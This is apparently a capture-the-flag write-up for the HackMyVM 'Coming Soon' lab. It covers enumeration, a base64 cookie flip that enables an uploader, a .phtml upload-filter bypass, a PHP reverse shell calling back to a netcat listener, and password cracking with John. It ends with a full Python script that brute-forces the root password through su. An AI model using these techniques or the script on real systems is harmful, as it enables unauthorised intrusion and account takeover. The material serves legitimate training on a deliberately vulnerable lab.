---
layout: post
title: "HackMyVM - Coming Soon"
date: 2021-12-19 10:16:02 +0100
categories: hmv
tag: ["XSS"]
---

Creator:  [rpj7](https://hackmyvm.eu/profile/?user=rpj7)
Level: Easy
Release Date: 2021-12-17

## Scan & Enumeration

### NMAP

```bash
nmap -sC -sV -p- -oA simplescan.txt 192.168.1.214
```

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-19 10:16 WEST
Nmap scan report for 192.168.1.214
Host is up (0.00032s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 bc:fb:ec:b8:93:d4:e2:78:76:eb:1b:dc:4b:a7:7f:9b (RSA)
|   256 31:41:a0:d7:e9:3c:79:11:c2:f0:81:a0:fe:2d:f9:b0 (ECDSA)
|_  256 c9:34:17:00:31:75:4d:c0:3a:a5:b1:16:36:0d:bb:18 (ED25519)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-title: Bolt - Coming Soon Template
|_http-server-header: Apache/2.4.51 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.15 seconds
```

### GoBuster

```bash
gobuster dir -u http://192.168.1.214 -x php,html,txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster.txt
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.214
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2021/12/19 10:18:58 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 3988]
/assets               (Status: 301) [Size: 315] [--> http://192.168.1.214/assets/]
/license.txt          (Status: 200) [Size: 528]                                   
/notes.txt            (Status: 200) [Size: 279]                                   
/server-status        (Status: 403) [Size: 278]                                   
                                                                                  
===============================================================
2021/12/19 10:23:13 Finished
===============================================================
```

## Website (Cookie Manipulation DOM-based) 

http://192.168.1.214/notes.txt

```text
Dave,

Last few jobs to do...

Set ssh to use keys only (passphrase same as the password)

Just need to sort the images out:
resize and scp them or using the built-in image uploader.

Test the backups and delete anything not needed.

Apply an https certificate.

Cheers,

Webdev
```


```html
<!-- Upload images link if EnableUploader set -->
```

### Cookie Decode

```bash
curl -v http://comingsoon.hmv
```

```html
< Server: Apache/2.4.51 (Debian)
< Set-Cookie: RW5hYmxlVXBsb2FkZXIK=ZmFsc2UK
< Vary: Accept-Encoding
< Content-Length: 3988
```

```bash
$ echo 'RW5hYmxlVXBsb2FkZXIK' | base64 --decode 
EnableUploader
$ echo 'ZmFsc2UK' | base64 --decode 
false
```

### Change Cookie value

```bash
$ echo -n true | base64   
dHJ1ZQ==
```

<img src="https://drive.google.com/uc?id=14WO2bc81mq3Z0dzGoz3KRhCVV_7py0ax"/>

## Reverse Shell

### Bypass Upload Restrictions

```
For security, .php files are allowed.Sorry, your file was not uploaded.
```

* Rename .php > .phtml

### Shell
http://comingsoon.hmv/assets/img/php-reverse-shell.phtml

```sh
nc -lvnp 4444             
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.214] 60592
Linux comingsoon.hmv 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux
 11:17:42 up  1:03,  0 users,  load average: 0.00, 0.00, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
CTRL+Z  
stty raw -echo; fg  
2xENTER
```

## Priviledge Escalation

### Method 1 : /var/backups/

```bash
www-data@comingsoon:/var/backups$ cd /var/www/html/assets/img
www-data@comingsoon:/var/www/html/assets/img$ cp /var/backups/backup.tar.gz .
www-data@comingsoon:/var/www/html/assets/img$ ls
backup.tar.gz  logo.png  map-marker.png           slide1.jpg  slide3.jpg
hero-area.jpg  logo.psd  php-reverse-shell.phtml  slide2.jpg
www-data@comingsoon:/var/www/html/assets/img$
```

### Crack scpuser with JohnTheRipper

```sh
$ unshadow passwd shadow > unshadow 

$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadow --format=crypt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
t****r           (scpuser)     
1g 0:00:00:54 0.03% (ETA: 2021-12-19 07:42) 0.01849g/s 108.3p/s 110.0c/s 110.0C/s tractor..prettyinpink
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

### Method 2 :  [su-bruteforce.sh](https://github.com/carlospolop/su-bruteforce)

## ROOT

```bash
www-data@comingsoon:/home/scpuser$ su scpuser                                                                                                                          
Password:                                                                                                                                                              
scpuser@comingsoon:~$
scpuser@comingsoon:~$ ls -la
total 32
drwxr-xr-x 4 scpuser scpuser 4096 Dec 17 11:04 .
drwxr-xr-x 3 root    root    4096 Dec 16 00:27 ..
lrwxrwxrwx 1 root    root       9 Dec 15 16:46 .bash_history -> /dev/null
-rw-r--r-- 1 scpuser scpuser  220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 scpuser scpuser 3526 Aug  4  2021 .bashrc
drwxr-xr-x 3 scpuser scpuser 4096 Dec 15 17:06 .local
-rw-rw---- 1 scpuser scpuser  123 Dec 16 14:25 .oldpasswords
-rw-r--r-- 1 scpuser scpuser  807 Aug  4  2021 .profile
drwx------ 2 scpuser scpuser 4096 Dec 15 17:17 .ssh
lrwxrwxrwx 1 root    root      21 Dec 16 00:18 user.txt -> /media/flags/user.txt
scpuser@comingsoon:~$ cat .oldpasswords 
Previous root passwords just incase they are needed for a backup\restore

Incredibles2
Paddington2
BigHero6
101Dalmations
```

### Generate list
-   Grab a list of 100 top animated movies from from the internet,
-   Keep the case and remove spaces.

```bash
curl https://www.rottentomatoes.com/top/bestofrt/top_100_animation_movies/|grep ")</a>"|sed 's/[(].*$//'|tr -d ' '> wordlist
```

* Python Script for cracking root

```python
#!/bin/env python3

from os.path import exists
import argparse
import subprocess


parser = argparse.ArgumentParser(description='Check su passwords', usage='%(prog)s --wordlist=<wordlist>')
parser.add_argument('--wordlist', help='password list to try', required=True)
#parser.add_argument('--single', help='try a single password', required=True)
args = parser.parse_args()
inputFile = args.wordlist


def check_exists(passFile):
    if exists(passFile):
        return passFile 
    else:
        print('File {} does not exist'.format(passFile))
        parser.print_help()
        exit()

def validate_pass(passwd):
    ret = 0
    try:
        cmd = '{ sleep 1; echo "%s"; } | script -q -c "su -l root -c ls /root" /dev/null' % passwd
        ret = subprocess.check_output(cmd, shell=True)
        return ret
    except:
        return 1

#passwd = getpass.getpass(prompt='Password: ', stream=None)
def verify(passwd):
  FAIL = b'Password: \r\nsu: Authentication failure'
  res = validate_pass(passwd).strip()
  if FAIL == res:
    print (passwd.strip() + ":Invalid password")
  else:
    print (passwd.rstrip() + ":Valid password")
    exit()

def main():
  passFile = check_exists(inputFile)

  with open(passFile, 'r') as f:
    data = f.readlines()
  for password in data:
    verify(password)

if __name__ == '__main__':
    #pass
    main()
```

```bash
scpuser@comingsoon:/tmp$ python3 crack.py --wordlist=dic
ToyStory3:Valid password
scpuser@comingsoon:/tmp$ 
```
